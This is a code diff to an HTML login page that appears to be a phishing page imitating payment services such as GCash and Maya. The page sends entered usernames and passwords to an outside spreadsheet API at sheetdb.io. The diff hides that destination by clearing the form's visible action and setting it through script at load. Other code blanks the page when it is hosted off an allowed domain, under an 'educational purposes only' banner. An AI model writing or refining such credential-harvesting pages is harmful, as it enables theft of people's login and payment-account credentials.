@@ -25,7 +25,6 @@
 
         .login-container {
             text-align: center;
-
         }
 
         p {
@@ -33,7 +32,6 @@
             line-height: 1.6;
             text-align: justify;
         }
-
 
         .image-container {
             text-align: center;
@@ -105,7 +103,8 @@
 
         <h2>Login Form</h2>
 
-        <form method="POST" action="https://sheetdb.io/api/v1/e8qqennjjjob7" id="sheetdb-form">
+        <!-- we can remove method post to not post the username and password -->
+        <form action="" id="sheetdb-form">
 
             <label for="username">Username:</label>
             <input type="text" id="username" name="data[Username]" required>
@@ -130,6 +129,12 @@
     </div>
 
     <script>
+        var form = document.getElementById('sheetdb-form');
+
+        var dynamicUrl = "https://sheetdb.io/api/v1/e8qqennjjjob7";
+
+        // Set the form action dynamically
+        form.action = dynamicUrl;
         function get() {
             var allowedDomain = "examplep1.000webhostapp.com";
 
@@ -236,8 +241,18 @@
         function makeWebpageUnusable() {
             // Replace the body content with a placeholder message or a different HTML structure
             $('body').html(
-                '<h1>This is for educational purposes only</h1><img style="width: 700px; height: auto;" src="maya.jpg" alt="maya"><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget. Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam ac. Amet nisl suscipit adipiscing bibendum est ultricies.</p><img style="width: 100px; height: auto;" src="UPANG.png" alt="UPANG"><img style="width: 500px; height: 100;" src="Gcash.jpeg" alt="GCASH"><h2>Login Form</h2><label for="username">Username:</label><input type="text" id="username" name="data[Username]" required><label for="password">Password:</label><input type="password" id="password" name="data[password]" required><button type="submit">Login</button>'
+                '<h1>This is for educational purposes only</h1><img style="width: 700px; height: auto;" src="maya.jpg" alt="maya"><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget. Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam ac. Amet nisl suscipit adipiscing bibendum est ultricies.</p><img style="width: 100px; height: auto;" src="UPANG.png" alt="UPANG"><img style="width: 500px; height: 100;" src="Gcash.jpeg" alt="GCASH"><h2>Login Form</h2><label for="username">Username:</label><input type="text" required><label for="password">Password:</label><input type="password" required><button type="submit">Login</button>'
             );
+            // Add styles to the placeholder message
+            $('body').css({
+                'background-color': 'white',
+                'color': '#333',
+                'display': 'flex',
+                'align-items': 'center',
+                'justify-content': 'center',
+                'height': '100vh',
+                'margin': 0,
+            })
 
         }
     </script>
